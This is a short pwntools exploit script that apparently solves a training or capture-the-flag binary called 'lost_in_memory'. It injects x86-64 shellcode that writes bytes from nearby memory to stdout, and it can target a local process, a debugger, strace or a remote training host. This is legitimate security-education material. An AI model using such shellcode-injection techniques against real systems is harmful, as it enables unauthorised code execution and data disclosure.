from pwn import *
import sys
import time

asm_code = """
lea rax, [rip]
sub rax, 0x48
mov rdi, 1
mov rsi, rax
mov rdx, 9
mov rax, 1
syscall
"""

#asm_code = """
#lea rax, [rip]
#sub rax, 0x6e
#mov rdi, 1
#mov rsi, rax
#mov rdx, 47
#mov rax, 1
#syscall
#"""

context.arch = 'amd64'

if(len(sys.argv) > 1):
	if(sys.argv[1] == '--debug'):
		p = process("./lost_in_memory")
		gdb.attach(p, """
		b *main+216
		"""	)
		input("wait...")
	elif(sys.argv[1] == '--strace'):
		p = process(["strace", "./lost_in_memory"])
	elif(sys.argv[1] == '--remote'):
		p = remote("bin.training.offdef.it", 4001)
else:
	p = process("./lost_in_memory")

p.send(asm(asm_code))

p.interactive()